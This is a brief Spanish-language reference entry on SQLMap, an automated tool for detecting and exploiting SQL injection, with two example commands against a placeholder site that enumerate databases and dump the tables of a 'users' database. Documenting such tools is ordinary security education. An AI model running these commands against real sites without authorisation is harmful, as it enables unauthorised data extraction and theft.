SQLMap

Inyección SQL

Herramienta automatizada para detección y explotación de SQLi.

$ sqlmap -u "http://ejemplo.com/page?id=1" --dbs
$ sqlmap -u "http://ejemplo.com/page?id=1" -D users --tables --dump
